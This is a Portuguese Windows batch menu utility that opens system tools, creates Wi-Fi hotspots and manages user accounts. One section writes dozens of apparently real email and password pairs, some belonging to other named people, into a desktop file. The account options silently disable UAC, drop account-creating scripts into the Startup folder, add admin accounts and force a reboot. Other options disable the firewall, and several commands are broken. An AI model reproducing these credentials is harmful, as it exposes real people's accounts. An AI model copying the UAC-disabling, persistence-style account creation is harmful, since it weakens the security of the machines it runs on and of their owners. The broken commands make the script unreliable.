
@echo off
:menu
cls

::MSG * /time 4 " O VERDADEIRO AMIGO NAO APARTA  A  BRIGA JA CHEGA NA VOADORA"
COLOR 3F
MODE 80,45
TITLE DLL DEDE WINDOWS\SYSTEM 32
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
ECHO  1)  CONTAS DE USUARIOS         9)  DIAGNOSTICO DE MEMORIA
ECHO  2)  RESTAURAR O SISTEMA        10) USUARIOS E GRUPO LOCAIS 
ECHO  3)  BACKUP                     11) LUPA    
ECHO  4)  SERVICOS DO PC             12) TRAVA PC
ECHO  5)  CRIAR PASTA COMPARTILHADA  13) ADICIONA HARDWERE
ECHO  6)  CONFIRMACAO DE ATUALIZACAO 14) DIRETIVAS DE GRUPO
ECHO  7)  VER A VERCAO DO WINDOWS    15) INICIO BACKUP
ECHO  8)  CONFIGURAR O SYSTEMA       16) VISUALIZADOR DE EVENTOS
ECHO  (IN)  CORES                    17) fechar explorer
ECHO ( fabri )  FABRICA JS    ( ad ) adaptadores de rede
ECHO  (bomb2) CONTADORES       ( ALG ) ALGRITIMO DE SENHA
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
ECHO       DIGITE อ SAIR อ PARA FECHAR  ออ  ULTIMAT ออ PARA OUTRO MENU
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
echo    (data) DATA NOS ARQUIVOS
echo    (pastas) ATALHO DAS PASTAS DO SISTEMA
ECHO    ( @ ) EMAIL
ECHO    (en)       encriptar dados
ECHO    (adhoc)    criar conecฦo de rede virtual   
ECHO    (VB)       CRIAR JANELAS EM VBS
ECHO    (LIM)      LIMPESA DO COPUTADOR
ECHO    (REV)      REVELAR
ECHO    (CRIP)      CRIPTOGRAFAR CARACTERES
ECHO    (LOKPASS)  CRIAR PASTA OCULTA
ECHO    (LIST)    LISTAR MINHAS PASTAS
ECHO    (ADM)    PROGRAMAS ADIMINISTRADORES
ECHO    (FAST)   PC MAIS RAPIDO
echo    (deswin) DESLIGANDO O WINDOWS
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ   
ECHO   (NET)    INTERNET / ROTEADORES
ECHO   (IMP)    IMPRESSORA
ECHO   (BAK)      BCKUP DE ARQUVOS
ECHO   (BOOT)    BOOT WIN  7
ECHO   (VDISK)    CRIAR DISCO VIRTUAL
ECHO   (DTUSB)    DESATIVAR USB
ECHO   (ATUSB)    ATIVAR USB
ECHO   (AUTPEN  OU  PEN )   AUTORUN E LINPAR PENDRIVER
ECHO   (BKREG)   BACKUP DO REGISTRO    
ECHO   (MENLOG)  MENSAGEM NO LOGON
ECHO  (ATALHO) ATALHO SECRETO DO WINDOWS
ECHO  (WALL) FIREWAL DO WINDOWS
echo  (revesco) REVELA E ESCONDE
echo อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

set /p nom=DIGITE O NUMERO DA SUA OPCAO NA TELA DO MENU 
if %nom% equ %nom% goto %nom%
echo MsgBox " COMANDO [ %nom% ] NรO EXISTE DIGITE AS OPวีES DO MENฺ ",vbOKOnly + vbInformation, "ERRO DE DIGITAวรO" >%temp%\wyz.vbs
start %temp%\wyz.vbs
::===========================criar rede virtual====================================
:ad
start ncpa.cpl
goto menu
:adhoc
echo ออออออออออออออออออออออออออออออออ
echo digite um nome para sua rede
echo ออออออออออออออออออออออออออออออออ
set /p nome=
cls
echo ออออออออออออออออออออออออออออออออ
echo digite sua senha de 8 digitos
echo ออออออออออออออออออออออออออออออออ
set /p senha=
netsh wlan set hostednetwork mode=allow ssid=%nome% key=%senha%
netsh wlan star hostednetwork
netsh wlan show hostednetwork
echo ออออออออออออออออออออออออออออออออ
echo para desfazer a conec็ใo clic enter
echo ออออออออออออออออออออออออออออออออ
pause
netsh wlan set hostednetwork mode=disallow
GOTO MENU
::==========================FIREWALL DO WINDOWS==========================================
:WALL
MODE 40,10
title         FIREWAL DO WINDOWS
color 70
cls
echo อออออออออออออออออออออออออออออออออออ
echo    FIREWAL DO WINDOWS
echo อออออออออออออออออออออออออออออออออออ
echo   ABRIR FIREWALL      ออ OPEN  ออ
echo   ATIVAR FIREWAL      ออ ATV   ออ
echo   DESATIVARA FIREWALL ออ CLOSE ออ
echo   vb voltar para o menu
echo อออออออออออออออออออออออออออออออออออ
set /p W=digite sua opcaoออ 
if %W% equ OPEN goto W
if %W% equ open goto W
if %W% equ ATV  goto W1
if %W% equ atv  goto W1
if %W% equ CLOSE goto W2
if %W% equ close goto W2
if %W% equ vb goto menu
if %W% equ VB goto menu
:W
MODE 20,3
C:\Windows\System32\WF.msc
goto WALL

:W1
MODE 80,30
netsh firewall set opmede enable
PAUSE
goto WALL
:W2
MODE 80,30
netsh firewall set opmede disable
PAUSE
goto WALL
::===========================ATALHO SECRETO DO WINDOWS===================================
:ATALHO
md C:\Users\%username%\Desktop\ATALHOS
CD C:\Users\%username%\Desktop\ATALHOS

md GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}

echo @echo off >computador.cmd
echo start ::{20D04FE0-3AEA-1069-A2D8-08002B30309D} >>computador.cmd
echo exit >>computador.cmd

echo @echo off >meus_documentos.cmd
echo start ::{450D8FBA-AD25-11D0-98A8-0800361B1103} >>meus_documentos.cmd
echo exit  >>meus_documentos.cmd

echo @echo off >UserName.cmd
echo start C:\Users\%username%\ >>UserName.cmd
echo exit >>UserName.cmd

echo @echo off >Downloads.cmd
echo start C:\Users\%username%\Downloads >>Downloads.cmd
echo exit >>Downloads.cmd 

echo @echo off >Musicas.cmd
echo start C:\Users\%username%\Music >>Musicas.cmd
echo exit >>Musicas.cmd

echo @echo off >fotos.cmd
echo start C:\Users\%username%\Pictures>>fotos.cmd
echo exit >>fotos.cmd 

echo @echo off >Videos.cmd
echo start C:\Users\%username%\Videos >>Videos.cmd
echo exit >>Videos.cmd



md C:\Users\%username%\Desktop\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}
echo MsgBox " ATALHO SECRETO DO WINDOWS CRIADO COM SUCESSO NA SUA AREA DE TRABLHO ",vbOKOnly + vbInformation, "ARQUIVOS DO WINDOWS" >%temp%\wyz.vbs
start %temp%\wyz.vbs
goto menu
:DTUSB
::===========================C๓digo para desativar a porta USB====================================
(
 echo Windows Registry Editor Version 5.00
 echo.
 echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsbStor]
 echo.
 echo “Start”=dword:00000004
)>C:\Users\%username%\Desktop\DESATV_USB.reg
GOTO MENU
:ATUSB
::===========================C๓digo para Ativar a porta USB====================================
Publicado em 21/10/2012
(
 echo Windows Registry Editor Version 5.00
 echo.
 echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsbStor]
 echo.
 echo “Start”=dword:00000003
)>C:\Users\%username%\Desktop\ATV_USB.reg
GOTO MENU
::=========================== DEICHAR O PC MAIS RAPIDO ====================================
:FAST
(
 echo netsh int tcp set global congestionprovider=ctcp 
 echo netsh int tcp set global dca=enabled
 echo netsh int tcp set global ecncapability=enabled
)>PC_MAIS_RAPIDO.BAT

netsh int tcp set global congestionprovider=ctcp 
netsh int tcp set global dca=enabled
netsh int tcp set global ecncapability=enabled
GOTO MENU
:@

cd "C:\Users\%username%\Desktop"
(
 ECHO  ================== AIRTON ======================== 
 ECHO  mercado livre 
 ECHO  ayrton.com@hotmail.com 
 ECHO  pass==compras 
 ECHO  ===============GOOGLE +===========================
 ECHO  google + 
 ECHO  djdedewil@hotmail.com 
 ECHO  pass== irton976 
 ECHO  ================4SHARED===========================
 ECHO  4shared/FACE 
 ECHO  ayrton.com@hotmail.com 
 ECHO  pass=Hackers01 
 ECHO  ==============PLAY STORE==========================
 ECHO  PLAY STORE 
 ECHO  WYZARDPLAY@GMAIL.COM
 ECHO  PASS=AIRTON123
 ECHO  ===============ELISANGELA/FACE==================== 
 ECHO  ELISANGELA_ARAUJO01@OUTLOOK.COM 
 ECHO  PASS=WONDERFUL01
 ECHO  =================CONTA ORIGIN=====================
 ECHO conta origin 
 ECHO nome:wy3939
 ECHO ayrton.com@hotmail.com
 ECHO PASS=Hackers01
 ECHO B344EH45KHXS33D4G2LC
 ECHO  =================CONTA YUTUBE=====================
 ECHO senha:gamerbriel200 
 ECHO email:gabriegamerland@gmail.com 
 echo e-mail em imvu :hayleyglaucous ( mellodystraw)
 echo senha: wannessa      (nessa123)
 echo facebook: Vanessabarby2010@hotmail.com
 echo senha: Wanessa
 echo E-mail de amor doce: vanessabarby@hotmail.com
 echo senha: barby2010
 echo nome da personagem em amor doce : anv
 echo E-mail de stardoll: vanessa barby2010@hotmail.com
 echo senha: barby2010
 echo GMAIL: VANESSABADGIRL2014@GMAIL.COM
 echo SENHA: VANEBISAH2014
 echo.
 echo ====================aliexpress==========================
 echo e-mail=ayrton.com@hotmail.com
 echo password=Airton01
 echo.
 echo ====================accounts google====================
 echo e-mail=djdedewil@hotmail.com
 echo password=Airtondj
 echo.
 echo ====================accounts google====================
 echo e-mail=djdedewil@hotmail.com
 echo password=irton976
 echo.
 echo ====================accounts google====================
 echo e-mail=guilhermecordeiro1@gmail.com
 echo password=macarrao01
 echo.
 echo ====================SamMobile==========================
 echo e-mail=sammobile.com
 echo usuario=airton0 
 echo password=1MqpTVXk 
 echo.
 echo ====================UBER.COM==========================
 echo e-mail=ayrton.com@hotmail.com
 echo password=viagens
)>"C:\Users\%username%\Desktop\EMAILS.SYS"


echo  MsgBox " ARQUIVO [ EMAILS ] CRIADO COM SUCESSO NA SUA AREA DE TRABALHO ",vbOKOnly + vbInformation, "WYZARD CORP" >%temp%\wyz.vbs
start %temp%\wyz.vbs
(
 ECHO @ ECHO OFF  
 ECHO COLOR 3F  
 ECHO TITLE VER EMAILS 
 ECHO TYPE "C:\Users\%username%\Desktop\EMAILS.SYS"  
 ECHO PAUSE^>NUL 
 ECHO DEL EMAILS.SYS /S /Q  
 ECHO DEL VER_EMAILS.CMD /S /Q  
)>"C:\Users\%username%\Desktop\VER_EMAILS.CMD"
GOTO MENU
:AUTPEN
::=========================AUTORUN NO PENDRIVER======================================
set /p i=DIGITE A LETRA DO PEN DRIVER 
set i=%i%:
%i%
md autorun.inf
cd autorun.inf
md.\com\
GOTO MENU
::=================================================================================

:BKREG
::===========================BACKUP DO REGISTRO====================================
@echo off
color 0a
mkdir BK
reg export "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" BK\key.reg

echo.
echo.
echo.
echo UMA COPIA DE SEGURACA FOI CRIADA NA PASTA (BK)
echo.
echo.
echo AGORA EXECUTE O ARQUIVO COMO ADMINISTRADOR 
echo.
echo.
echo PARA FAZER ALTERACAO NO REGISTRO
echo.
echo.
echo CASO CONTRARIO TERA ACESSO NEGADO
echo.
echo.
echo.
pause
goto menu
:MENLOG
color 0a
set /p t=DIGITE AQUI O TอTULO DA JANELA
set /p txt=AQUI DIGITE SEU TEXTO DA JANELA
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t reg_sz /d " %t% " /F
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t reg_sz /d " %txt% " /F
echo.
echo.
pause
GOTO MENU
==========================================================================================================



:1
::===================CONTAS DE USUARIOS===============================


:CONTAVIAMSDOS
CLS
title CRIANDO CONTA VIA MS DOS
color 3f
echo.
echo อออออออออออออออออออออออออออออออ
echo CRIAR CONTAS DE USUARIOS
echo อออออออออออออออออออออออออออออออ
echo.
echo  ( A ) CRIAR CONTAS
echo.
echo  ( B ) ATIVAR E DESATIVAR CONTAS
echo.
echo  ( C ) INSERIR OU PAGAR SENHAS
echo.
echo  ( D ) CRIAR REDE WIFI
echo.
echo  ( E ) AJUDA
echo.
echo  ( V ) VOLTA PARA MENU
echo.
 choice /C ABCDEFV /N
 IF %errorlevel%==7 goto menu
 IF %errorlevel%==6 goto AUPADM
 IF %errorlevel%==5 goto COD
 IF %errorlevel%==4 goto wifi
 IF %errorlevel%==3 goto PASS
 IF %errorlevel%==2 goto ATVDES
 IF %errorlevel%==1 goto MD

  
:MD
CLS
echo.
echo อออออออออออออออออออออออออออออออ
echo CRIANDO CONTA DE USUARIOS
echo อออออออออออออออออออออออออออออออ
echo.
echo  ( A )CONTAS DE USUARIOS PADRAO
echo.
echo  ( B )CONTAS DE USUARIOS ADM
echo.
echo  ( C ) VOLTA
echo.
choice /C ABC /N
 IF %errorlevel%==3 goto CONTAVIAMSDOS
 IF %errorlevel%==2 goto ADM
 IF %errorlevel%==1 goto PADRAO
:PADRAO
net user
echo.
echo อออออออออออออออออออออออออออออออ
echo NOME DA CONTA
echo อออออออออออออออออออออออออออออออ
echo.
set /p acon= 
cls
echo MsgBox "SE NAO QUISER COLOCAR SENHA DEIXE EM BRANCO E APERTE ENTER ",vbOKOnly + vbInformation, "CRIANDO ARQUIVOS" >%temp%\wyz.vbs
start %temp%\wyz.vbs
echo.
echo อออออออออออออออออออออออออออออออ
echo SENHA DA CONTA
echo อออออออออออออออออออออออออออออออ
echo.
set /p pass= 

cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo net user %acon% %pass% /add >>conta.cmd
echo del /q conta.cmd >>conta.cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v enableLUA /t reg_DWORD /d 0 /f
shutdown -r -t 0
net user 
GOTO MD
:ADM
CLS
echo.
echo อออออออออออออออออออออออออออออออ
echo NOME DA CONTA
echo อออออออออออออออออออออออออออออออ
echo.
set /p acon= 
cls
echo.
echo อออออออออออออออออออออออออออออออ
echo SENHA DA CONTA
echo อออออออออออออออออออออออออออออออ
echo.
set /p pass= 
CLS
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
(
 echo net user %acon% %pass% /add 
 echo net localgroup administrators %acon% /add
 echo net localgroup administradores %acon% /add
 echo del /q conta.cmd
)>conta.cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v enableLUA /t reg_DWORD /d 0 /f
shutdown -r -t 0
GOTO MD


:pass
net user
CLS
echo อออออออออออออออออออออออออออออออ
echo INSERIR E LIMPAR SENHAS
echo อออออออออออออออออออออออออออออออ
echo.
echo  ( A )LIMPAR SENHA 
echo.
echo  ( B )INSERIR SENHA
echo.
echo  ( C )voltar pro menu
echo.
choice /C ABC /N  
 IF %errorlevel%==3 goto CONTAVIAMSDOS
 IF %errorlevel%==2 goto IN
 IF %errorlevel%==1 goto CL

:IN
CLS
net user
echo อออออออออออออออออออออออออออออออ
echo  INSERINDO SENHA
echo อออออออออออออออออออออออออออออออ
echo.
set /p psw="DIGITE O NOME DA CONTA="

net user %psw% *

pause > nul
goto pass
:CL
CLS
net user
echo อออออออออออออออออออออออออออออออ
echo LIMPANDO SENHA
echo อออออออออออออออออออออออออออออออ
echo.
set /p psw="DIGITE O NOME DA CONTA="
net user %psw% *

pause > nul
GOTO PASS


:ATVDES
CLS
echo อออออออออออออออออออออออออออออออ
echo  ATIVANDO CONTA DE USUARIOS
echo อออออออออออออออออออออออออออออออ
echo.
echo  ( A )ATIVAR PADRAO
echo.
echo  ( B )DESATIVAR PADRAO
echo.
echo  ( C )ATIVAR ADM
echo.
echo  ( D )DESATIVAR ADM
echo.
echo  ( E ) ADICIONAR CONTA AOS ADM
echo.
echo  ( F )VOLTAR
echo.
choice /C ABCDEF /N 
 IF %errorlevel%==6 goto CONTAVIAMSDOS
 IF %errorlevel%==5 goto ADADM
 IF %errorlevel%==4 goto DCADM
 IF %errorlevel%==3 goto ACADM 
 IF %errorlevel%==2 goto DCP
 IF %errorlevel%==1 goto ACP

:ACADM
CLS
net user administrador /active:yes

pause > nul
GOTO ATVDES

:ACP
CLS

net user
echo อออออออออออออออออออออออออออออออ
echo  ADICIONAR CONTA DE USUARIOS
echo อออออออออออออออออออออออออออออออ
echo.
set /p nco=NOME_DA_CONTA= 
net user %nco% /add
net user
pause > nul
 GOTO ATVDES

:DCP
cls 
net user
ECHO.
echo อออออออออออออออออออออออออออออออ
echo  DELETAR CONTA DE USUARIOS
echo อออออออออออออออออออออออออออออออ
echo.
set /p dnc=NOME_DA_CONTA=
net user %dnc% /DELETE

net user
pause > nul
goto ATVDES

:DCADM
cls
net user administrador /active:no
net user
pause > nul
::========================================
:: comando para opcoes de escolha
::========================================
echo อออออออออออออออออออออออออออออออ
echo DELETAR CONTA ADM
echo อออออออออออออออออออออออออออออออ
echo.
set /p nco=NOME_DA_CONTA= 
net user %nco% /DELETE
cls
net user
pause > nul
GOTO ATVDES


:ADADM
cls
net user
echo.
echo อออออออออออออออออออออออออออออออ
echo ADICIONANDO CONTA AO GRUPO ADM
echo อออออออออออออออออออออออออออออออ
echo.
echo DIGITE O NOME DA CONTA
echo.
set /p user= 

net localgroup administrators %user% /add
net user
pause > nul
GOTO ATVDES
::===================================================================
:: REDE WIFI
::===================================================================
:wifi
title REDES WIFI
CLS
echo อออออออออออออออออออออออออออออออ
echo  CRIAR REDE WIFI
echo อออออออออออออออออออออออออออออออ
echo.
echo NOME DA REDE=%n%
echo.
echo PASSWORD=%p%
echo.
set /p n=REDE= 
cls
echo อออออออออออออออออออออออออออออออ
echo  CRIAR REDE WIFI 
echo อออออออออออออออออออออออออออออออ
echo.
echo NOME DA REDE=%n%
echo.
echo PASSWORD=%p%
echo.
set /p p=%n% / PASS:
::criando a rede
netsh wlan set hostednetwork ssid=%n% key=%p% mode=allow
::iniciando a rede
netsh wlan start hostednetwork

::===================================================================
::           MENSAGEM
::===================================================================

echo MsgBox "QUER SALVAR ARQUIVO DE SUA CONTA ? ",vbOKOnly + vbInformation, "CRIANDO ARQUIVOS" >%temp%\wyz.vbs
start %temp%\wyz.vbs
pause
CLS
echo อออออออออออออออออออออออออออออออ
echo SALVAR ARQUIVO DA CONTA ?
echo อออออออออออออออออออออออออออออออ
echo.
echo  ( S )SALVAR ARQUIVO DA CONTA 
echo.
echo  ( N )NAO SALVAR CONTA
echo.
choice /C SN /N  
 IF %errorlevel%==2 goto DONT
 IF %errorlevel%==1 goto SAVE
:SAVE
::===================================================================
:: SALVAR ARQUIVO
::===================================================================
echo อออออออออออออออออออออออออออออออ
echo  NOME DO ARQUIVO DE REDE
echo อออออออออออออออออออออออออออออออ
set /p ark=

(
 echo :RD 
 echo @echo off
 echo color 3f
 echo date /t
 echo time /t
 echo echo อออออออออออออออออออออออออออออออ
 echo echo  MINHA REDE WIFI 
 echo echo อออออออออออออออออออออออออออออออ
 echo echo.
 echo echo ^(A^) ATIVAR REDE
 echo echo ^(D^) DESATIVAR REDE
 echo echo ^(C^) CRIAR A REDE
 echo echo ^(R^) VERIFICAR REDE
 echo echo.
 echo echo ----------------------------------------
 echo echo DATA DE INICIO %%date:~0,2%%/%%date:~3,2%%/%%date:~ 6,10%% HORA/%%time:~0,2%%:%%time:~3,2%%
 echo echo ----------------------------------------
 echo echo NOME DA REDE / %%n%%
 echo echo ----------------------------------------
 echo echo PASSWORD / %%p%%
 echo echo ----------------------------------------
 echo choice /C ADCR /N 
 echo IF %%errorlevel%%==4 goto VERIF
 echo IF %%errorlevel%%==3 goto CRIAR
 echo IF %%errorlevel%%==2 goto DESAT
 echo IF %%errorlevel%%==1 goto ATIV
 echo :CRIAR
 echo netsh wlan set hostednetwork ssid=%%n%% key=%%p%% mode=allow
 echo ::iniciando a rede
 echo netsh wlan start hostednetwork mode=allow
 echo GOTO RD
 echo :VERIF
 echo start ncpa.cpl
 echo GOTO RD
 echo :DESAT
 echo netsh wlan set hostednetwork mode=desallow
 echo netsh wlan set hostednetwork ssid=%%n%% key=%%p%% mode=desallow
 echo GOTO RD
 echo :ATIV
 echo netsh wlan set hostednetwork ssid=%%n%% key=%%p%% mode=allow
 echo ::iniciando a rede
 echo netsh wlan start hostednetwork mode=allow
 echo GOTO RD
)>"C:\Users\%username%\Desktop\%ark%.cmd"

start ncpa.cpl
GOTO CONTAVIAMSDOS

:DONT
start ncpa.cpl
GOTO CONTAVIAMSDOS
::para desativar a rede
netsh wlan set hostednetwork mode=allow
netsh wlan set hostednetwork ssid=meuwifi key=1234567890 mode=desallow
::iniciando a rede
netsh wlan start hostednetwork
::para desativar a rede
netsh wlan set hostednetwork mode=desallow
GOTO CONTAVIAMSDOS
==============================================================================
:cod
cls
echo (Cria uma conta sem senha)
echo net user "NOME_DA_CONTA" /add
echo.
echo (Cria uma conta com senha)
echo net user "NOME_DA_CONTA" "SUA_SENHA" /add
echo.
echo (Ativar a conta)
echo net user "NOME_DA_CONTA" /active:yes
echo.
echo (desativar a conta)
echo net user "NOME_DA_CONTA" /active:no
echo.
echo (incerir a senha)
echo net user "NOME_DA_CONTA" * "SUA_SENHA)
echo.
echo (limpar a senha)
echo net user "NOME_DA_CONTA" * "enter_duas_vezes)
echo.
echo (Apenas alterando a senha)
echo net user "NOME_DA_CONTA" "SUA_SENHA)
echo.
echo (adicionar conta ao grupo adm)
echo net localgroup administrators "NOME_DA_CONTA" /add
echo.
pause
cls
echo อออออออออออออออออออออออออออออออ
echo DESEJA CRIAR O ARQUIVO DE AJUDA
echo อออออออออออออออออออออออออออออออ
echo.
echo  ( S )CRIAR O ARQUIVO
echo.
echo  ( N )VOLTA 
echo.
 choice /C SN /N
 IF errorlevel=2 GOTO CONTAVIAMSDOS
 IF errorlevel=1 goto RED

:RED

(
 echo @ECHO OFF
 echo COLOR 0A
 echo title  AJUDA PARA CRIAR CONTAS DE USUARIO
 echo echo.
 echo echo ษออออออออออออออออออออออออออออออออออออออออออออออออออออป
 echo echo บ ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ ARQUIVO DE AJUDA ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ บ
 echo echo ศออออออออออออออออออออออออออออออออออออออออออออออออออออผ
 echo echo. 
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo ฺด  Cria Uma conta sem senha ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user  NOME_DA_CONTA  /add                   ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo. 
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                      
 echo echo ฺด Cria Uma conta com senha  ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user NOME_DA_CONTA SUA_SENHA /add           ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo. 
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                     
 echo echo ฺด       Ativar a conta      ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user NOME_DA_CONTA /active:yes              ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo.
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       
 echo echo ฺด     Desativar a conta     ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user NOME_DA_CONTA /active:no               ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo.
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       
 echo echo ฺด      incerir a senha      ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user NOME_DA_CONTA * "SUA_SENHA"            ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo. 
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                       
 echo echo ฺด     Escluir a senha       ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user NOME_DA_CONTA * enter_duas_vezes       ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo. 
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                      
 echo echo ฺด Apenas alterando a senha  ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net user NOME_DA_CONTA "SUA_SENHA"              ณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo. 
 echo echo  ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ                   
 echo echo ฺด Adicionar conta ao grupo adm ณ
 echo echo ณภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤมฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
 echo echo รฤฤ net localgroup administrators NOME_DA_CONTA /addณ
 echo echo ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
 echo echo. 
 echo pause ^>nul
)>"C:\Users\%username%\Desktop\help.cmd"

GOTO CONTAVIAMSDOS
  






MODE 20,3
Netplwiz.exe
echo @echo off>DESABILITAR_CONTAS_DE_USUARIOS.cmd
echo :: DESABILITAR A PROTEวรO DE CONTA DE USUมRIO>>DESABILITAR_CONTAS_DE_USUARIOS.cmd
echo reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVญersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f>>DESABILITAR_CONTAS_DE_USUARIOS.cmd


echo @echo off>ABILITAR_CONTAS_DE_USUARIOS.cmd
echo :: HABILITAR A PROTEวรO DE CONTA DE USUมRIO>>ABILITAR_CONTAS_DE_USUARIOS.cmd
echo reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVญersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f >>DESABILITAR_CONTAS_DE_USUARIOS.cmd
cls 
goto menu
:2
::===================restaurar sistema========================================
MODE 20,3
rstrui.exe 
cls 
goto menu
:3
::===================bakup e restarar bakup===========================
MODE 20,3
sdclt.exe 
cls 
goto menu
:4
::===================servi็os do pc===================================
MODE 20,3
services.msc 
cls 
goto menu
:5
::===================CRIAR pastA COMPARTILHADA========================
MODE 20,3
shrpubw.exe
cls 
goto menu
:6 
::===================CONFIRMAวรO DE ATUALIZAวรO=======================
MODE 20,3
WindowsAnytimeUpgradeResults.exe 
cls 
goto menu
:7 
::===================VER A VERวรO DO WINDOWS==========================
MODE 20,3
winver.exe  
cls 
goto menu
:8
::===================CONFIGURAR O SYSTEMA=============================
MODE 20,3
msconfig.exe 
cls 
goto menu
:9
::===================DIAGNOSTICO DE MEMORIA===========================
MODE 20,3
MdSched.exe  
cls 
goto menu
:10
::===================USUARIOS E GRUPO LOCAIS==========================
MODE 20,3
lusrmgr.msc 
cls 
goto menu
:11 
::===================LUPA=============================================
MODE 20,3
Magnify.exe 
cls 
goto menu
:12
::===================trava pc=========================================
MODE 20,3
logoff.exe 
cls 
goto menu
:13
